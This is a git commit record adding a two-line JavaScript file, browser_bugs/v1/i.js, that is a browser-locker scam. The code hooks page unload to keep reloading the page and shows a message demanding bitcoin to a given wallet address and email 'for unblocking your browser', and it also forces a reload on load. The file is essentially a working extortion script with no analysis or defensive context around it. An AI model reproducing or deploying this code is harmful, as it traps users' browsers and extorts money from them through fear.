17517dda29afe56487a473461f30c1c99e6d9c28
ichensky <ichensky@live.com>
2014-12-10 02:27:12 +0200

    add base files

---
+++ browser_bugs/v1/i.js
@@ -0,0 +1,2 @@
+onbeforeunload=function(){location.reload(); return "For unblocking your browser, sent bitcoin:\n\n18AE2Ug3d63vgfRSnqMr45qd4HkRDoyMsC\n\npocolab.com@gmail.com"}
+onload=location.reload()
